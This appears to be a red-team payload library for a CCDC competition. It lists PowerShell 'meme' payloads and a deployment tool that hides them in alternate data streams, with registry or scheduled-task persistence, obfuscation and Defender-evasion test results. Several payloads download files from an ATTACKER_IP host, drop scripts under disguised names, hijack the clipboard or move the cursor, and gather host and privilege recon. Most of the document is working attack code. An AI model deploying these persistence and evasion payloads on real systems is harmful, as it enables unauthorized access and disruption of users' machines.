# ADS Meme Payload Library

Cheeky, visible-impact payloads for competition environments — earns style points while proving access.

> **Validation status is tracked per-payload below.**
> MEME-001, 003, 007 are still unvalidated. MEME-002, 004, 005, 006 were VM-tested
> on 2026-02-19 (Win11 Build 26200, PS 5.1, Defender SigV 1.445.152.0, RTP enabled).
>
> **Session context warnings:**
> - Payloads marked **INTERACTIVE ONLY** require a logged-in user session (Session 1+).
>   They are **invisible** when run from SYSTEM via Task Scheduler (Session 0).
>   Use `-Persist registry` for guaranteed user-session delivery — the Run key fires
>   in the user's own logon session. `-Persist task -Trigger AtLogOn` runs as SYSTEM
>   in Session 0 and will NOT show windows/effects to the logged-in user.
> - Payloads marked **SYSTEM OK** work from any session.
>
> **Parameter reminders:**
> - Zero-width stream names are enabled via `-Obfuscate Advanced` or `-Obfuscate Paranoid`.
> - `-Encrypt` — BUG-011 is **FIXED** (Session 12-14) pending full VM validation. The
>   `_wrapEC` / `-EncodedCommand` fix prevents ClickFix.TFC at execution time. T1-v2 and
>   T4-v2 (unencrypted) confirmed PASS in Session 15. T3-v2 and T11-v2 (encrypted) need
>   re-run with fixed runbook. See `tests/RT4-BUG011-EXECTIME.md` for test status.

---

## MEME-001: Desktop Goose Flock Deployment
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — requires pre-staged binary

The goose deserves a proper flock. This downloads and launches multiple goose instances
that honk, drag windows around, and leave muddy footprints.

```powershell
# MEME-001: Goose Flock — downloads Desktop Goose and launches N instances
# NOTE: Requires interactive session. Deploy via -Persist registry for user-session execution.
$n=3; $gooseUrl='http://ATTACKER_IP:8080/GooseDesktop.exe'
$gooseDir="$env:APPDATA\WindowsGoose"
if(!(Test-Path $gooseDir)){New-Item $gooseDir -ItemType Directory -Force|Out-Null}
$goosePath="$gooseDir\GooseDesktop.exe"
if(!(Test-Path $goosePath)){(New-Object Net.WebClient).DownloadFile($gooseUrl,$goosePath)}
1..$n|ForEach-Object{Start-Process $goosePath -WindowStyle Normal}
```

Pre-stage note: Host `GooseDesktop.exe` on your attack box. The goose binary is open source.
For maximum hilarity, set `InstanceCount 5` so each box gets 5 independent persistence mechanisms,
each launching 3 geese. That's 15 geese per host.

---

## MEME-002: Wall of Notepads (Cascading Window Flood)
**Session:** INTERACTIVE ONLY
**Status:** VALIDATED ✓ — M4 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed (10 notepads created on first fire).

> **AtLogOn delivery caveat (confirmed by field test):** Scheduled tasks run as SYSTEM (Session 0).
> Notepad processes launched in Session 0 are invisible to the user desktop.
> For guaranteed user-session delivery, use **`-Persist registry`** — the registry Run key
> fires in the user's own logon session. M4 field test confirmed: "Did NOT work after
> logout/login" when deployed with `-Persist task -Trigger AtLogOn`.

```powershell
# MEME-002: Opens 10 notepads in a cascading pattern, each with a message
# INTERACTIVE SESSION ONLY — use -Persist registry for reliable user-session delivery
$msg = "      _     `n     (o>    `n     //\    `n    V_/_    `n`nRed Team Was Here`nCCDC 2026"
1..10 | ForEach-Object {
    $f = "$env:TEMP\rt_$_.txt"; $msg | Out-File $f -Force
    Start-Process notepad $f; Start-Sleep -Milliseconds 200
}
```

Scale up `1..10` to `1..50` for maximum chaos in a real deployment. 10 is the safe test count.

---

## MEME-003: Rick Astley Background Service (Audio Rick Roll)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — requires pre-staged audio file

```powershell
# MEME-003: Downloads and plays Never Gonna Give You Up on loop
# INTERACTIVE SESSION ONLY — no audio device in Session 0
$mp3 = "$env:APPDATA\update_check.mp3"
if(!(Test-Path $mp3)){(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/rick.mp3',$mp3)}
Add-Type -AssemblyName presentationCore
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open([uri]"file:///$($mp3 -replace '\\','/')")
$player.Play()
Start-Sleep -Seconds 212  # Full song length
```

---

## MEME-004: The Matrix Rain (Persistent Console Effect)
**Session:** SYSTEM OK (creates its own console window)
**Status:** VALIDATED ✓ — M3 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed ("window visible — nostalgic").

> **Time-limited for competition safety:** Runs for 2 minutes then exits cleanly.
> Infinite-loop versions accumulate multiple processes when the task fires on each interval.
> Scale up `AddMinutes(2)` for longer effect.

```powershell
# MEME-004: Spawns a PowerShell that creates a Matrix rain console window
# SYSTEM OK — creates its own console. Time-limited to 2 min for competition safety.
$matrix = @'
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Green"
Clear-Host
$w = $host.UI.RawUI.WindowSize.Width
$drops = @{}
$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()"
$end = [DateTime]::Now.AddMinutes(2)
while([DateTime]::Now -lt $end){
    $col = Get-Random -Maximum $w
    $drops[$col] = 0
    foreach($c in @($drops.Keys)){
        $y = $drops[$c]
        if($y -lt $host.UI.RawUI.WindowSize.Height){
            $host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates($c,$y)
            Write-Host $chars[(Get-Random -Maximum $chars.Length)] -NoNewline -ForegroundColor Green
            $drops[$c]++
        } else { $drops.Remove($c) }
    }
    Start-Sleep -Milliseconds 50
}
'@
$f = "$env:ProgramData\sysmon_diag.ps1"; $matrix | Out-File $f -Force
Start-Process powershell -ArgumentList "-NoProfile -File `"$f`"" -WindowStyle Normal
```

---

## MEME-005: Caps Lock Disco (Blinks Caps/Num/Scroll Lock LEDs)
**Session:** SYSTEM OK (targets system keyboard buffer)
**Status:** VALIDATED ✓ — M2 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed (LEDs blinked). Terminal visible when task fired manually — hidden when
triggered automatically by scheduler (expected behavior).

> **Recommended: use the time-limited variant below** — Infinite loop accumulates multiple
> processes if the task fires on each periodic interval.

```powershell
# MEME-005 (RECOMMENDED): Time-limited Caps Lock disco — 60 seconds, then exits cleanly
$wsh = New-Object -ComObject WScript.Shell
$end = (Get-Date).AddSeconds(60)
while((Get-Date) -lt $end){
    $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 400
}
```

```powershell
# MEME-005 (AGGRESSIVE): Infinite loop — only safe with -Persist none (one-shot delivery)
$wsh = New-Object -ComObject WScript.Shell
while($true){
    $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 200
    $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 200
    $wsh.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 200
}
```

---

## MEME-006: Clipboard Rickroll (Replaces clipboard contents periodically)
**Session:** SYSTEM OK
**Status:** VALIDATED ✓ — M1 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed (clipboard replaced with rickroll text). Terminal visible when task fired
manually — hidden when triggered automatically by scheduler (expected behavior).

```powershell
# MEME-006: Every 30 seconds, replaces clipboard with rickroll lyrics
# Works from SYSTEM — clipboard is shared across sessions on same desktop
while($true){
    Set-Clipboard "Never gonna give you up, never gonna let you down. Red Team <3 CCDC 2026"
    Start-Sleep -Seconds 30
}
```

---

## MEME-007: Cursor Earthquake (Subtle mouse jitter)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED

```powershell
# MEME-007: Adds tiny random jitter to mouse position every 2 seconds
# Subtle enough to drive someone crazy before they realize it's not their mouse
Add-Type -AssemblyName System.Windows.Forms
while($true){
    $p = [System.Windows.Forms.Cursor]::Position
    $dx = Get-Random -Minimum -3 -Maximum 4
    $dy = Get-Random -Minimum -3 -Maximum 4
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($p.X+$dx),($p.Y+$dy))
    Start-Sleep -Seconds 2
}
```

---

## MEME-008: OIIA Spinning Proof-of-Compromise
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new in Session 15

Tribute to the OIIA spinning cat meme. Spawns a visible PowerShell console showing a
spinning ASCII cat animation cycling through 4 frames, alongside live recon: hostname,
username, privilege level, local admin count, and timestamp. Runs for 30 seconds then
exits cleanly. Proof-of-compromise that blue team will actually see.

> **Deploy with `-Persist registry`** — Run key fires in user's own logon session where
> console windows are visible. `-Persist task -Trigger AtLogOn` runs as SYSTEM in
> Session 0 — the window spawns there and is invisible to the interactive user.

```powershell
# MEME-008: OIIA Spinning Proof-of-Compromise
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
# Spawns a separate visible console window; parent script exits immediately
$oiia = @'
$frames = @(
    @("  /\_/\ ","  (^o.o^)","   > ^ < ","  oiia~  "),
    @("  /\_/\ ","  ( -.- )","   > ^ < ","  ~oi    "),
    @("  /\_/\ ","  (^o.o^)","   < ^ < ","   ~oiia "),
    @("  /\_/\ ","  (~.-~) ","   < ^ < ","  oi~    "))
$adm = try { (Get-LocalGroupMember Administrators -EA 0).Count } catch { 0 }
$pv = @{$true = "ELEVATED"; $false = "Standard"}[
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)]
$recon = @(
    "",
    "  Host    : $(hostname)",
    "  User    : $(whoami)",
    "  Privs   : $pv",
    "  Admins  : $adm local administrator account(s)",
    "  Time    : $([DateTime]::Now.ToString('HH:mm:ss'))",
    "",
    "  [Apparition - Red Team CCDC 2026]",
    "")
$end = [DateTime]::Now.AddSeconds(30)
$host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
while ([DateTime]::Now -lt $end) {
    foreach ($g in $frames) {
        if ([DateTime]::Now -ge $end) { break }
        Clear-Host
        Write-Host "`n  ~~ OIIA OIIA OIIA ~~" -ForegroundColor Magenta
        $g | ForEach-Object { Write-Host "  $_" -ForegroundColor Cyan }
        $recon | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
        $left = ($end - [DateTime]::Now).Seconds
        Write-Host "  [oiia-ing for ${left}s...]" -ForegroundColor DarkGray
        Start-Sleep -Milliseconds 220
    }
}
Clear-Host
'@
$f = "$env:ProgramData\oiia_diag.ps1"
$oiia | Out-File $f -Force -Encoding UTF8
Start-Process powershell -ArgumentList "-NoProfile -File `"$f`"" -WindowStyle Normal
```

---

## MEME-009: OIIA Desktop Graffiti
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 15

Drops a persistent text file containing ASCII OIIA cat art + live proof-of-compromise
info (hostname, user, timestamp, privilege level) to the user's Desktop, Public Desktop,
and Temp directory. Named `OIIA_RED_TEAM_WAS_HERE.txt` — immediately visible in File
Explorer on next logon. File persists until explicitly deleted. No UI, no windows.
Works from SYSTEM in Session 0.

```powershell
# MEME-009: OIIA Desktop Graffiti — persistent file drop
# SYSTEM OK — works from Task Scheduler, no interactive session needed
# Drops proof-of-compromise file to Desktop, Public Desktop, and Temp
$adm = try { (Get-LocalGroupMember Administrators -EA 0).Count } catch { "?" }
$pv = @{$true = "ELEVATED"; $false = "Standard"}[
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)]
$art = @"
  /\_/\    oiia oiia oiia oiia oiia
  (o.o )   ~~~ OIIA RED TEAM ~~~
  > ^ <
 (       )
  \_/_\_/

  PROOF OF COMPROMISE
  ===================
  Host   : $(hostname)
  User   : $(whoami)
  Privs  : $pv
  Admins : $adm local administrator(s)
  Date   : $([DateTime]::Now)

  You have been visited by Apparition.
  oiia oiia oiia oiia oiia oiia oiia
"@
foreach ($p in @("$env:PUBLIC\Desktop", "$env:USERPROFILE\Desktop", "$env:TEMP")) {
    $art | Out-File "$p\OIIA_RED_TEAM_WAS_HERE.txt" -Force -EA 0
}
```

---

## Deployment Examples

> **Note:** Use `-Persist registry` for interactive payloads (MEME-001, 002, 003, 007, 008) —
> registry Run key fires in the user's own logon session. `-Persist task -Trigger AtLogOn`
> runs as SYSTEM in Session 0 and will NOT show windows to the logged-in user.
> MEME-009 is SYSTEM OK — deploy with any persist method.

```bash
# Clipboard rickroll (SYSTEM OK — task persistence works fine):
pwsh ./src/ADS-OneLiner.ps1 \
  -Payload 'while($true){Set-Clipboard "Never gonna give you up - Red Team <3";Start-Sleep 30}' \
  -Persist task \
  -OutputFile clipboard-payload.txt

# Caps Lock disco — time-limited variant, registry for user session:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/caps-disco-60s.ps1 \
  -Persist registry \
  -Obfuscate Paranoid \
  -OutputFile disco-payload.txt

# Notepad flood — registry persistence required for visible effect on user desktop:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/notepads.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile notepads-payload.txt

# Goose flock — registry persistence, 3 independent instances:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/goose-flock.ps1 \
  -Persist registry \
  -Randomize:$true \
  -InstanceCount 3 \
  -OutputFile goose-payload.txt

# OIIA spinning cat proof — INTERACTIVE, must use -Persist registry:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-008-oiia-spin.ps1 \
  -Persist registry \
  -Trigger AtLogOn \
  -Obfuscate Basic \
  -OutputFile oiia-spin-payload.txt

# OIIA desktop graffiti — SYSTEM OK, works from any persist method:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-009-oiia-graffiti.ps1 \
  -Persist task \
  -Trigger AtLogOn \
  -Obfuscate Advanced \
  -OutputFile oiia-graffiti-payload.txt
```
